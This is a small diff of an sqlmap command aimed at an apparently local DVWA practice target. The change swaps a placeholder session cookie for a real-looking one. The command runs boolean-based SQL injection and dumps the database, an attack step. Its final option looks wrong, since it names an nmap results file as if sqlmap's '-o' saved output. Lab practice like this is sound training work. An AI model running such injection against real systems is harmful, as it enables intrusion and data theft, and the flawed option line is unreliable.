@@ -1,5 +1,5 @@
 sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="security=low; PHPSESSID=YOUR_SESSION_COOKIE" \
+  --cookie="security=low; PHPSESSID=7urmi49qup0nj0ddukqithli32" \
   --batch --dump --level=1 --risk=1 \
   --dbms=mysql --technique=B \
   -o nmap-scan-results.txt  # Optional: save output
